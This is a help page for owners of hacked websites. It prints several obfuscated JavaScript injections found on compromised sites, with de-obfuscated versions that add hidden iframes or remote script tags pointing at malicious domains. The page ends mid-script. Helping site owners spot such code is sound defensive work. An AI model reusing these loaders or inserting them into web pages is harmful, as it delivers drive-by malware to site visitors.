@@ -1,0 +1,259 @@
+
+Redleg Home
+"Aw Snap" My website has been hacked! Now what? A few tips from redleg.
+Examples of malicious javascript
+
+If the hackers are using script to hack your site it will be obfuscated to try and hide what the script is doing. This type of hack can be inserted in individual html/php pages on a site or into one of the javascript files. The bottom line is, if you see blocks of obfuscated script in one of your files be suspicious, check to make sure you know exactly what the script is doing.
+
+In the vast majority of hacks the obfuscated script is going to write either an iframe or a script call into the pages of the site. The src="http://some.malicious.site/malicious.php" will be a URL that loads the malicious content into the page.
+While I believe it would be an excellent coding technique for hackers to use the word malicious, or maybe malware, in domain names, folder names and file names I have never actually seen it done. Not sure why!
+
+Now a few examples of code I have seen on hacked sites.
+
+<sc​ript>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.from​CharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('i 9(){a=6.h(\'b\');7(!a){5 0=6.j(\'k\');6.g.l(0);0.n=\'b\';0.4.d=\'8\';0.4.c=\'8\';0.4.e=\'f\';0.m=\'w://z.o.B/C.D?t=E\'}}5 2=A.x.q();7(((2.3("p")!=-1&&2.3("r")==-1&&2.3("s")==-1))&&2.3("v")!=-1){5 t=u("9()",y)}',41,41,'el||ua|indexOf|style|var|do​cument|if|1px|MakeFrameEx|element|yahoo_api|height| width|display|none|body|get​ElementById|function|createElement|iframe|append​Child|src|id|nl|msie| toLowerCase|opera|webtv||setTimeout|windows|http|userAgent|1000|juyfdjhdjdgh|navigator|ai| showthread|php|72241732'.split('|'),0,{}))
+</sc​ript>
+
+Which de-obfuscates to ->
+
+function MakeFrameEx(){
+  element = do​cument.get​ElementById('yahoo_api');
+  if (!element){
+    var el = do​cument.cr​eateElement('if​rame');
+    do​cument.body.append​Child(el);
+    el.id = 'yahoo_api';
+    el.style.width = '1px';
+    el.style.height = '1px';
+    el.style.display = 'none';
+    el.src = 'hxxp://​juyfdjhdjdgh​.nl​.ai​/showthread.php?t=72241732'
+  }
+}
+var ua = navigator.userAgent.toLowerCase();
+if (((ua.indexOf("msie") !=- 1 && ua.indexOf("opera") ==- 1 && ua.indexOf("webtv") ==- 1))
+ && ua.indexOf("windows") !=- 1){
+  var t = setTimeout("MakeFrameEx()", 1000)
+}
+
+This following script is also fairly common right now. The hackers have used the JavaScript date object  date=new Date();  to try and conceal the malicious purpose. That along with the obfuscated script help to get the code past a cursory look.
+
+<sc​ript>date=new Date();var ar="Jp}g3ra]A\"kmTdQh{,'=Dyi)cf>1(0o[F<BnCs? e.wvlu:HGtNb; /EM";try{gserkewg();}catch(a){k=new Boolean().toString()};var ar2="f159,0,-93,9,42,-33,-45,51,-18,63,-102,87,-15,42,-24,-114,111,27,18,-33,-12,-87,87,-15,42, -36,-9,-39,-27,-18,-9,141,-132,15,87,-36,-30,99,-63,-51,24,-9,15,24,-6,-66,48,-21,111,0,0,-93,9, -60,3,15,87,-105,69,-15,87,3,0,-153,111,3,12,-21,9,-3,-69,111,0,0,-120,51,-18,63,-102,87,-15,42, -24,3,-111,51,81,-27,-36,-57,72,-33,9,-60,3,15,87,-3,-6,-96,57,-15,-3,-9,102,0,-144,135,24,0,-153, 3,99,9,-105,114,-63,6,48,3,-108,120,27,-96,39,18,-120,42,-42,111,-96,39,-15,0,-12,66,6,24,-84, 123,-141,0,0,36,42,-93,15,120,21,-135,42,-72,102,-60,30,93,-141,18,0,99,-81,-18,-18,144,-144, -15,48,0,-3,63,9,-60,-27,108,-102,12,-3,27,6,-33,63,-72,75,-54,-57,36,102,-90,-3,27,6,-33,63,-6, 36,-84,69,-12,-63,-3,75,-63,45,-45,87,-87,66,-66,81,-84,75,-93,21,-27,0,81,-15,51,-153,87,21,-45, 81,-81,24,15,33,-120,135,-42,-21,42,3,12,-27,36,-24,-12,-45,72,-9,-51,69,-9,-57,-87,135,-51,69, -102,24,21,63,-96,9,-60,3,15,87,-42,-51,42,87,3,0,-153,153,0,-84,60,-30,-33,75,-81,24,15,12,-51, 9,-60,3,15,87,-105,69,-15,-21,111,0,0,-30,-111,-3,102,-42,42,-60,60,-78,51,-18,63,-102,87,-15, 42,-24,-51,-57,105,-102,129,-27,45,-33,-12,-87,87,-15,42,-63,-30,12,9,-60,3,15,87,-66,15,87, -81,48,-12,9,27,-123,123,0,-132,51,87,-18,12,-27,-36,-30,57,-96,57,-18,-3,3,-9,102,0,-144,135, 24,0,-153,3,99,9,-105,114,-63,6,48,3,-108,120,27,-96,39,18,-120,42,-42,111,-96,39,-15,0,-12,66, 6,24,-84,123,-141,0,0,36,42,-93,15,120,21,-135,42,-72,102,-60,30,93,-141,18,0,99,-81,-18,-18, 144,-144,-15,48,0,-3,15,87,-81,48,-12,36,-84,69,-12,3,6,-63,45,-45,87,-87,66,-66,81,-84,-6,-3, -9,21,-27,0,81,-15,-51,102,-81,48,-12,36,-84,69,-12,3,-120,87,21,-45,81,-81,24,15,-48,-3,-36, 135,-42,-21,42,3,12,-27,-66,102,-81,48,-12,36,-84,69,-12,3,9,-12,-45,72,-90,-3,33,-33,102,-81, 48,-12,36,-84,69,-12,3,24,-57,-87,54,-3,33,-33,102,-81,48,-12,9,27,-123,123,0,-132,51,87,-18, 12,-27,-36,-30,72,-60,-27,108,-102,9,-3,3,27,6,-33,15,87,-81,48,-12,9,27,-123,123,0,-132,51,87, -18,12,-27,-36,-30,-9,75,-54,-57,36,102,-93,-3,3,27,6,-33,15,87,3,0,0,-120,51,-18,63,-102,87, -15,42,-24,-114,111,27,18,-33,-12,-87,87,-15,42,-36,-9,-39,-27,-18,-9,141,-132,15,87,-36,-30, 99,-63,-51,24,-9,15,24,-6,-66,102,-105,-15,0,117,-15,-66,69,-63,21,66,-93,45,-9,-6,87,3, 0,-153]".replace(k.substr(0,1),'[');pau="rn ev2010".replace(date.getFullYear()-1,"al");e=new Function("","retu"+pau);e=e();ar2=e(ar2);s="";var pos=0;for(i=0;i<ar2.length;i++){pos+=parseInt(k.replace("false","0asd"))+ar2[i]/3;s+=ar.substr(pos,1);}e(s);</sc​ript>
+
+If you de-obfuscate the script it is pretty obvious that the script is malicious. The values (numbers) set in the variable var ar2  will vary depending on the domain being set for the source of the iframe.
+
+if (do​cument.get​Elements​ByTagName('body')[0]){   iframer();
+}
+else {
+  do​cument.wr​ite("
+&lt;if rame src='hxxp://​g3service​.ru​/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQQHDQAMAg==' width='10'
+ height='10' style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
+}
+function iframer(){
+  var f = do​cument.cr​eateElement('iframe');
+  f.setAttribute('src',
+  'hxxp://​g3service​.ru​/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQQHDQAMAg==');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.get​ElementsByTagName('body')[0].append​Child(f);
+}
+
+There are a lot of variants of this script, again the content will vary depending on the malicious domain being used.
+
+<!-- . --><sc ript&gt;var ar="=2}Cd8 pvsyw:AlEeTcBNfb6u&gt;1&lt;,)h.r3'niao0 g;/{m[\"(t]";try{'qwe'.length(1);}catch(a){k=new Boolean().toString();date=new Date();};var ar2="f120,120,108,63,18,144,12,114,54,72,135,48,105,147,93,123,48,147,45,42,48,135,48,105,147, 27,57,30,51,111,123,60,111,135,48,144,102,66,114,12,30,102,87,138,117,150,87,132,120,120,120, 108,63,96,111,135,48,96,144,87,126,120,120,6,18,48,42,27,48,18,132,120,120,120,12,114,54,72, 135,48,105,147,93,33,96,108,147,48,144,141,81,108,63,96,111,135,48,18,27,96,54,0,102,90,147, 147,21,36,129,129,3,117,69,93,78,99,117,93,78,3,78,93,78,3,15,129,108,135,111,123,48,27,129, 72,21,42,114,111,12,93,90,147,135,42,102,18,33,108,12,147,90,0,102,78,117,102,18,90,48,108, 123,90,147,0,102,78,117,102,18,27,147,30,42,48,0,102,24,108,27,108,66,108,42,108,147,30,36, 90,108,12,12,48,105,126,21,114,27,108,147,108,114,105,36,111,66,27,114,42,72,147,48,126,42, 48,63,147,36,117,126,147,114,21,36,117,126,102,75,81,129,108,63,96,111,135,48,75,141,87,126, 120,120,6,120,120,63,72,105,54,147,108,114,105,18,108,63,96,111,135,48,96,144,87,132,120, 120,120,24,111,96,18,63,18,0,18,12,114,54,72,135,48,105,147,93,54,96,48,111,147,48,45,42,48, 135,48,105,147,144,102,108,63,96,111,135,48,102,87,126,63,93,27,48,147,39,147,147,96,108, 66,72,147,48,144,102,27,96,54,102,84,102,90,147,147,21,36,129,129,3,117,69,93,78,99,117,93, 78,3,78,93,78,3,15,129,108,135,111,123,48,27,129,72,21,42,114,111,12,93,90,147,135,42,102,87, 126,63,93,27,147,30,42,48,93,24,108,27,108,66,108,42,108,147,30,0,102,90,108,12,12,48,105, 102,126,63,93,27,147,30,42,48,93,21,114,27,108,147,108,114,105,0,102,111,66,27,114,42,72,147, 48,102,126,63,93,27,147,30,42,48,93,42,48,63,147,0,102,117,102,126,63,93,27,147,30,42,48,93, 147,114,21,0,102,117,102,126,63,93,27,48,147,39,147,147,96,108,66,72,147,48,144,102,33,108, 12,147,90,102,84,102,78,117,102,87,126,63,93,27,48,147,39,147,147,96,108,66,72,147,48,144, 102,90,48,108,123,90,147,102,84,102,78,117,102,87,126,120,120,120,12,114,54,72,135,48,105, 147,93,123,48,147,45,42,48,135,48,105,147,27,57,30,51,111,123,60,111,135,48,144,102,66,114, 12,30,102,87,138,117,150,93,111,21,21,48,105,12,9,90,108,42,12,144,63,87,126,120, 120,6]".replace(k.substr(0,1),'[');pau="rnev2010"[('afas','rep')+('rhrh','lace')](date[('adsaf','getF')+'ullY'+('qwtrqwt','ear')]()-1,('awgwag',"al"));e=Function("retu"+pau)();ar2=('gfhgffg',e(ar2));s="";for(i=0;i!=ar2.length;i++){s+=ar.substr(ar2[i]/3,1);}
+e(s);</sc ript><!-- . -->
+
+de-obfuscates to
+
+if (do​cument.getElementsByTagName('body')[0]){   iframer();
+}
+else {
+  do​cument.write("
+&lt;iframe src='hxxp:// orjbhasqs . co . be/forum.php?tp=4a4e85585df3e7c1' width='10' height='10'
+style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://orjbhasqs.co.be/forum.php?tp=4a4e85585df3e7c1');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.getElementsByTagName('body')[0].append​Child(f);
+}
+
+This obfuscated code writes an iframe.
+
+<script>el=do​cument.createElement("div");el.innerHTML="&#82;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#69;&#114;&#114;";try{try{a1=a2}catch(a){b[2]=21};}catch(a){k=el.innerHTML+a.toString().substr(0,0);};var ar=",\"C0hgev)=z(liwysc/dp'}[No1rB.Tf]; A>b taEun{<:m";var ar2="R136,0,-84,72,28,-108,32,24,-32,100,20,-164,148,-16,-40,-96,4,132,8,-116,-24,164,-164,148, -16,-92,48,-52,60,40,-140,76,64,28,-164,20,40,64,-48,-24,-16,24,-52,60,-80,116,-96,144,-40,0,0, -84,72,-16,52,28,-164,84,-64,-12,100,4,0,-48,64,-128,24,16,-40,128,24,-40,0,0,-60,24,-32,100,20, -164,148,-16,-40,-60,52,-56,104,-132,20,-40,176,-128,72,-16,52,28,-164,128,-88,44,-40,-32,48, -68,140,0,-76,104,-112,0,-24,28,24,24,-72,-32,40,-40,136,4,-96,52,-48,-28,76,-48,0,4,52,-24,8,60, 20,-72,-36,-64,64,4,68,-96,-4,24,80,-140,20,48,20,-92,72,68,-136,8,28,-32,-4,140,-120,48,20,-92, 72,68,-88,92,-96,-12,-24,12,48,-56,24,12,-12,96,-96,-4,4,104,-96,124,-168,36,24,0,-52,148,-40, -52,20,-36,-12,104,-104,48,72,12,-24,-12,-84,36,-52,120,-12,-132,108,-84,-24,100,32,28,-172, 120,24,-56,-20,104,-172,120,-48,60,36,-108,-20,72,-16,52,28,-164,120,-140,28,100,4,0,-48,48, 0,-12,44,4,-104,88,-104,48,72,-20,-100,72,-16,52,28,-164,84,-64,-12,144,-40,0,0,-108,132,-52, 44,-28,28,-116,116,-76,24,-32,100,20,-164,148,-16,-40,-48,40,-84,136,-4,-132,140,-116,-24, 164,-164,148,-16,-112,40,-32,72,-16,52,28,-164,60,-52,100,-8,-8,-52,-40,132,-16,16,0,-48,-56, 96,20,-12,-132,20,40,-20,44,-40,16,-84,84,-68,140,0,-76,104,-112,0,-24,28,24,24,-72,-32,40,-40, 136,4,-96,52,-48,-28,76,-48,0,4,52,-24,8,60,20,-72,-36,-64,64,4,-52,100,-8,-8,-52,92,-96,-12,-24, 92,-88,24,12,-12,96,-96,-4,4,104,-96,-24,48,-68,36,24,0,-52,148,-88,48,-8,-8,-52,92,-96,-12,-24, 92,-36,20,-36,-12,104,-104,48,72,-136,48,76,-12,-84,36,-52,120,-12,-132,60,48,-8,-8,-52,92,-96, -12,-24,92,-68,-24,100,32,-120,48,-72,72,48,-8,-8,-52,92,-96,-12,-24,92,40,-56,-20,-44,48,-72,72, 48,-8,-8,-52,-40,132,-16,16,0,-48,-56,96,20,-12,-132,20,40,-28,-4,24,80,-140,68,-84,84,20,-92,72, -52,100,-8,-8,-52,-40,132,-16,16,0,-48,-56,96,20,-12,-132,20,40,-68,8,28,-32,-4,140,-72,-84,84, 20,-92,72,-52,100,4,0,0,-60,24,-32,100,20,-164,148,-16,-40,-96,4,132,8,-116,-24,164,-164,148, -16,-92,48,-52,60,40,-140,76,64,28,-164,20,40,64,-48,-24,-16,24,-52,60,-80,116,-12,44,-80,0, -56,148,-96,-68,8,36,-4,28,-32,80,-92,100,4,0,-48]".replace(k.substr(0,1),'[');pau="urn eReferenceErr".replace(k,"val");e=Function("ret"+pau)();ar2=e(ar2);s="";var pos=0;for(i=0;i!=ar2.length;i++){e('pos+=parseInt(k.replace("Referen","0asd"))+ar2[i]/4');e('s+=ar.substr(pos,1)');}
+e(s);</script>
+
+
+de-obfuscates to
+
+if (do​cument.getElementsByTagName('body')[0]){
+  iframer();
+}
+else {
+  do​cument.write("
+<iframe src='hxxp://ldofigygtas.cz.cc/forum.php' width='10' height='10' style='visibility:
+hidden;position:absolute;left:0;top:0;'></iframe>");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://ldofigygtas.cz.cc/forum.php');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.getElementsByTagName('body')[0].append​Child(f);
+}
+
+
+<sc​ript>el=do​cument.createElement("div");el.innerHTML="&#82;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#69;&#114; &#114;";try{try{a1=a2}catch(a){b[2]=21};}catch(a){k=el.innerHTML+a.toString().substr(0,0);};var ar=",\"C0hgev)=z(liwysc/dp'}[No1rB.Tf]; A>b taEun{<:m";var ar2="R136,0,-84,72,28,-108,32,24,-32,100,20,-164,148,-16,-40,-96,4,132,8,-116,-24,164,-164,148, -16,-92,48,-52,60,40,-140,76,64,28,-164,20,40,64,-48,-24,-16,24,-52,60,-80,116,-96,144,-40,0,0, -84,72,-16,52,28,-164,84,-64,-12,100,4,0,-48,64,-128,24,16,-40,128,24,-40,0,0,-60,24,-32,100,20, -164,148,-16,-40,-60,52,-56,104,-132,20,-40,176,-128,72,-16,52,28,-164,128,-88,44,-40,-32,48, -68,140,0,-76,104,-112,0,-24,28,24,24,-72,-32,40,-40,136,4,-96,52,-48,-28,76,-48,0,4,52,-24,8, 60,20,-72,-36,-64,64,4,68,-96,-4,24,80,-140,20,48,20,-92,72,68,-136,8,28,-32,-4,140,-120,48, 20,-92,72,68,-88,92,-96,-12,-24,12,48,-56,24,12,-12,96,-96,-4,4,104,-96,124,-168,36,24,0,-52, 148,-40,-52,20,-36,-12,104,-104,48,72,12,-24,-12,-84,36,-52,120,-12,-132,108,-84,-24,100,32, 28,-172,120,24,-56,-20,104,-172,120,-48,60,36,-108,-20,72,-16,52,28,-164,120,-140,28,100,4,0, -48,48,0,-12,44,4,-104,88,-104,48,72,-20,-100,72,-16,52,28,-164,84,-64,-12,144,-40,0,0,-108,132 ,-52,44,-28,28,-116,116,-76,24,-32,100,20,-164,148,-16,-40,-48,40,-84,136,-4,-132,140,-116,-24, 164,-164,148,-16,-112,40,-32,72,-16,52,28,-164,60,-52,100,-8,-8,-52,-40,132,-16,16,0,-48,-56,96, 20,-12,-132,20,40,-20,44,-40,16,-84,84,-68,140,0,-76,104,-112,0,-24,28,24,24,-72,-32,40,-40,136, 4,-96,52,-48,-28,76,-48,0,4,52,-24,8,60,20,-72,-36,-64,64,4,-52,100,-8,-8,-52,92,-96,-12,-24,92, -88,24,12,-12,96,-96,-4,4,104,-96,-24,48,-68,36,24,0,-52,148,-88,48,-8,-8,-52,92,-96,-12,-24,92, -36,20,-36,-12,104,-104,48,72,-136,48,76,-12,-84,36,-52,120,-12,-132,60,48,-8,-8,-52,92,-96,-12, -24,92,-68,-24,100,32,-120,48,-72,72,48,-8,-8,-52,92,-96,-12,-24,92,40,-56,-20,-44,48,-72,72,48, -8,-8,-52,-40,132,-16,16,0,-48,-56,96,20,-12,-132,20,40,-28,-4,24,80,-140,68,-84,84,20,-92,72, -52,100,-8,-8,-52,-40,132,-16,16,0,-48,-56,96,20,-12,-132,20,40,-68,8,28,-32,-4,140,-72,-84,84, 20,-92,72,-52,100,4,0,0,-60,24,-32,100,20,-164,148,-16,-40,-96,4,132,8,-116,-24,164,-164,148, -16,-92,48,-52,60,40,-140,76,64,28,-164,20,40,64,-48,-24,-16,24,-52,60,-80,116,-12,44,-80,0, -56,148,-96,-68,8,36,-4,28,-32,80,-92,100,4,0,-48]".replace(k.substr(0,1),'[');pau="urn eReferenceErr".replace(k,"val");e=Function("ret"+pau)();ar2=e(ar2);s="";var pos=0;for(i=0;i!=ar2.length;i++){e('pos+=parseInt(k.replace("Referen","0asd"))+ar2[i]/4');e('s+=ar.substr(pos,1)');}
+e(s);</sc​ript>
+
+
+if (do​cument.getElementsByTagName('body')[0]){
+  iframer();
+}
+else {
+  do​cument.write("
+<iframe src='hxxp://ldofigygtas.cz.cc/forum.php' width='10' height='10' style='visibility:
+hidden;position:absolute;left:0;top:0;'></iframe>");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://ldofigygtas.cz.cc/forum.php');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.getElementsByTagName('body')[0].append​Child(f);
+}
+
+
+This malicious script is also fairly common right now.  With pick colors or try pick colors the hackers have tried to conceal the purpose as some sort of CSS and  again they have obfuscated the script.
+
+<sc ript type="text/javascript" >
+if (typeof(redef_colors)=="undefined") { var div_colors = new Array('#4b8272',  '#81787f',  '#832f83',  '#887f74',  '#4c3183',  '#748783',  '#3e7970',  '#857082',  '#728178',  '#7f8331',  '#2f8281',  '#724c31',  '#778383',  '#7f493e',  '#3e8642',  '#723c79',  '#808474',  '#81883d',  '#72893d',  '#72723e',  '#79823e',  '#798084',  '#748188',  '#3d7c78',  '#7d3d7f',  '#777f31',  '#4d0000');
+var redef_colors = 1; var colors_picked = 0; func tion div_pick_colors(t, styled) {var s = "";for (j=0;j &lt; t.length;j++) {var c_rgb = t[j];for (i=1;i &lt; 7;i++) {var c_clr = c_rgb.substr(i++,  );if (c_clr!="00") s += String.fromCharCode(parseInt(c_clr,  )-15);}}if (styled) {s = s.substr(0,  ) + s.substr(36, (s.length-38)) + div_colors[1].substr(0,  )+new Date().getTime() + s.substr((s.length-2));} else {s = s.substr(36, (s.length-38)) + div_colors[1].substr(0,  )+new Date().getTime();}return s; } func tion try_pick_colors() {try { if(!do​cument.get​ElementById || !do​cument.createElement){ doc ument.write (div_pick_colors(div_colors,  )); } else {var new_cstyle=do​cument.createElement(" sc ript ");new_cstyle.type="text/javascript";new_cstyle.src=div_pick_colors(div_colors,  );do​cument.getElementsByTagName("head")[0].append​Child(new_cstyle);}} catch(e) { }try {check_colors_picked();} catch(e) { setTimeout("try_pick_colors()",  500);} }
+try_pick_colors();}
+</sc ript >
+
+This is another common JavaScript hack that you usually see this one after the </html> tag on html and php pages.  Hackers like to place their malicious code outside of the <html>  </html> tags because it does not show up when editing a page with many of the WYSIWYG type editors in the compose mode.  You have to use the edit html or view/edit source mode to see it.
+
+
+<sc ript>
+var t="";
+var arr="646f63756d656e742e777269746528273c696672616d65207372633d22687474703a2f2f766e62 757974612e636f2e62652f666f72756d2e7068703f74703d3637356561666563343331623166373222 2077696474683d223122206865696768743d223122206672616d65626f726465723d2230223e3c2f6 96672616d653e2729";for(i=0;i<arr.length;i+=2)t+=String.fromCharCode(parseInt(arr[i]+arr[i+1],16));eval(t);</sc​ript>
+
+The code writes an iframe which loads the malicious content from another site. Again with this hack the content of the variable  arr will vary depending on the malicious domain used to load the content.
+
+
+do​cument.write('<if rame src="hxxp://vnbuyta.co.be/forum.php?tp=675eafec431b1f72" width="1" height="1" frameborder="0"></if rame>')
+
+or
+<sc ript>
+var t="";
+var arr="646f63756d656e742e777269746528273c696672616d65207372633d22687474703a2f2f6361737 46c6f61642e636f6d2f666f72756d2e7068703f74703d363735656166656334333162316637322220776 96474683d223122206865696768743d223122206672616d65626f726465723d2230223e3c2f6966726 16d653e2729";
+for(i=0;i< arr.length;i+=2)t+=String.fromCharCode(parseInt(arr[i]+arr[i+1],16));eval(t); </sc ript>
+
+<if rame src="hxxp://castload.com/forum.php?tp=675eafec431b1f72" width="1" height="1" frameborder="0"></if rame>
+
+This example loads a the malicious code through a script call loading some malicious code from an external site.
+
+
+
+var NxfaGVHq="jTUZZ23jTUZZ30";var PGuDO0uq0="jTUZZ3cjTUZZ73jTUZZ63jTUZZ72";
+var PGuDO0uq1="jTUZZ69jTUZZ70jTUZZ74jTUZZ20"; var PGuDO0uq2="jTUZZ74jTUZZ79jTUZZ70jTUZZ65";
+var PGuDO0uq3="jTUZZ3djTUZZ22jTUZZ74jTUZZ65"; var PGuDO0uq4="jTUZZ78jTUZZ74jTUZZ2fjTUZZ6a";
+var PGuDO0uq5="jTUZZ61jTUZZ76jTUZZ61jTUZZ73"; var PGuDO0uq6="jTUZZ63jTUZZ72jTUZZ69jTUZZ70";
+var PGuDO0uq7="jTUZZ74jTUZZ22jTUZZ20jTUZZ73"; var PGuDO0uq8="jTUZZ72jTUZZ63jTUZZ3djTUZZ22";
+var PGuDO0uq9="jTUZZ68jTUZZ74jTUZZ74jTUZZ70"; var PGuDO0uq10="jTUZZ3ajTUZZ2fjTUZZ2fjTUZZ70";
+var PGuDO0uq11="jTUZZ61jTUZZ6cjTUZZ77jTUZZ61"; var PGuDO0uq12="jTUZZ73jTUZZ2ejTUZZ73jTUZZ65";
+var PGuDO0uq13="jTUZZ72jTUZZ76jTUZZ65jTUZZ68"; var PGuDO0uq14="jTUZZ74jTUZZ74jTUZZ70jTUZZ2e";
+var PGuDO0uq15="jTUZZ63jTUZZ6fjTUZZ6djTUZZ2f"; var PGuDO0uq16="jTUZZ2fjTUZZ6djTUZZ6cjTUZZ2e";
+var PGuDO0uq17="jTUZZ70jTUZZ68jTUZZ70jTUZZ22"; var PGuDO0uq18="jTUZZ3ejTUZZ20jTUZZ3cjTUZZ2f";
+var PGuDO0uq19="jTUZZ73jTUZZ63jTUZZ72jTUZZ69"; var PGuDO0uq20="jTUZZ70jTUZZ74jTUZZ3e";
+var RCpB2eON="KZril23jTUZZ30";
+var PVqIW5sV=PGuDO0uq0+PGuDO0uq1+PGuDO0uq2+PGuDO0uq3+PGuDO0uq4+PGuDO0uq5+ PGuDO0uq6+PGuDO0uq7+PGuDO0uq8+PGuDO0uq9+PGuDO0uq10+PGuDO0uq11+PGuDO0uq12+ PGuDO0uq13+PGuDO0uq14+PGuDO0uq15+PGuDO0uq16+PGuDO0uq17+PGuDO0uq18+ PGuDO0uq19+PGuDO0uq20; EbphZcei=PVqIW5sV.replace(/jTUZZ/g,"%");
+var eWfleJqh=unescape;
+var NxfaGVHq="pqXdQ23KZril30";q9124=this;var SkuyuppD=q9124["WYd1GoGYc2uG1mYGe2YnltY".replace(/[Y12WlG\:]/g, "")];SkuyuppD.write(eWfleJqh(EbphZcei));
+
+The obfuscated code writes
+
+<sc ript type="text/javascript" src="hxxp://palwas.servehttp.com//ml.php"></sc ript>
+
+and here is another example
+
+<sc ript type="text/javascript"> mim=22;mim+=0.012;jay=0.016;jay+=19;has='xmDeB';vig=moo('THJrrc9mPS',5);fen=1594;tip=0.0118;if(tip<14){ohs=1326;ohs++;ask=23;ask++}nim=moo('ExBWOB4XquJZ8l0h5MnMl37j2zZHx0eZStpY3trfFkYl2VtTRtAyX3UamBnEl0W GBROBg1aPdM8lub5UrAYaTSMWcTxNa4PYpSzU60jZYGTlwhRmJEXWUrv1n4G8WSBp9bDlftJ Y8curQu1MF67liSZ0AXHCXGmT0pr0jiLZTltUD1',7);reb=null;pix=4129;pix-=8622;beg=do​cument;beg[vig](nim);function moo(zp,zu){var gb,pw,k,po,gb,gq,ru,ul,rv,b,ry,k,ua,bm,us,j,k,pl,gq,pl,gm,up,rv;v=0.006;v--;g=4328;g--;p=0.0117;p--;u=1483;if(u==15){r=8699;r-=12}b=pom();z=null;z+=1542;s=0;s-=6;n=false;j=38;h=0;h-=11;d=3537;if(d==19){l=0.015;l--}m='gnu';j+=24;f=0.005;f-=1011;a=0.012;a-=3073;k='Xdfromxmh'[b](2,4);c=7673;if(c==0){t=12;if(t<9){w=[9,36,45,18,27,54,0]}}i=null;i-=0.017;k+='ALdCharXuO'[b](3,4);y=5;y+=0.0508;o='Rk7bmPf54r';q=0.005;if(q!=null){gv='all'}k+='oEQCodeHt6'[b](3,4);gp=28;if(gp==22){gu=2392;gu+=23}gr=19;gr--;gb='FWindeRgjZ'[b](2,4);gz=['who','pah'];gs=0.0085;gs--;gn=4637;gb+='EFxOfSJ0'[b](2,3);gh=[0,18,9,27];gd='M1D54QV';gl=1028;gl--;gm=15;gf=0.049;gf--;ga=['lea','fax'];gk=3271;gm+=1;gc=6272;if(gc<2955){gt=0.007;if(gt<21){gw=0.0052;gw++;gi=3698;gi-=6195}}gx=14;gy=19;if(gy==null){go=0.003;go++}gq='zwtlennY'[b](3,3);ge=5561;ge++;pv=0.0123;if(pv<null){pg=7736;if(pg==7791){pp=22;pp++;pu=3891;pu+=28}pr='J7U4Ii'}pb=10;pb-=7120;gq+='IX9hgth_Uwf'[b](4,3);ps=0.0135;pn=0.004;if(pn==24){pj=6132;pj++;ph=8188;if(ph==0){pd='pro'}}pl='dUOJsubLP'[b](4,3);pm=4643;pm++;pf=0.048;pl+='mF4strtVc'[b](3,3);pk=2624;pk++;pc=0.0016;pc-=0.007;pt=27;pt-=8692;pw='7hOpR5eGNYvMr4EAVSwuK3djIbz91ZCa28gmq6XlyBQtkxLJiUD0HnPWoTscFf';pi=7584;px=0.004;px+=7909;py=19;py--;po='';pq=0.016;pq+=8954;pe=3157;if(pe>1607){uv=2039;uv--;ug={pes:0.0415}}up='';uu=null;uu+=7;ur=29;if(ur!=15){ub={sae:'lee'}}uz=6582;uz--;us=0;un=0.004;if(un>0.0091){uj=0.002;uj-=17}uh=0.004;uh--;ud=0.076;ud++;ul=zp[gq];um=[16,8,0,24];uf=null;uf-=22;for(ua=0;ua<ul;ua++){uk=0.017;uk--;uc=0.0278;uc+=6427;ut=15;if(ut<0){uw=17;if(uw!=0){ui=7105;ui-=24;ux=0.0726;ux+=15}}us+=zu;uy=8;if(uy==null){uo=15;uo--}uq=4788;uq--;ue=18;ue+=8978;rv=zp[pl](ua,1);rg=0;rg+=2994;rp=28;rp--;ru=pw[gb](rv);rr=0.0063;rr-=25;rb=2624;if(rb<0){rz=0;rz-=14}rs=7888;rs+=10;ru+=us;rn=0;rn-=0.014;rj=5779;if(rj==2521){rh=6966;rh+=18}ru%=j;rd='bro';rl=5738;rm=['bod','fid','gae'];po+=pw[pl](ru,1);rf=true;ra=null}rk=2612;if(rk<8429){rc=20;rc++;rt=0.004;rt-=26}rw=5;if(rw>2863){ri=30;ri++;rx=0.0166;rx--}for(ry=0;ry<ul;){ro=8338;ro-=5891;rq=10;if(rq>0.0116){re=[0,7,21,14]}bv=17;if(bv==0){bg=13}rv=po[pl](ry,2);bu=0.0029;if(bu==6726){br=0.031;if(br>2374){bb=0.002;if(bb>0.002){bz=6496}bs=0.007;if(bs!=19){bn=0.0014;bn--;bj=0.011}}bh=0.0127;bh--}bd=1127;bd++;bl=8094;bl+=0.017;bm=parseInt(rv,gm);bf=null;bf-=25;ba=28;ba+=0.0114;up+=String[k](bm);bk=26;if(bk>5){bc=0.016;bc-=0.0085;bt=0.0221;bt+=1247}bw=0.011;bw-=3122;ry+=2;bi=0.0471;if(bi>0.006){bx=true;by=8;by--}bo=1744;bo--}bq='QbLDKPuMp';be=0.016;be++;zv=0.0103;if(zv>0.0148){zg=false}return up}function pom(b,s){var 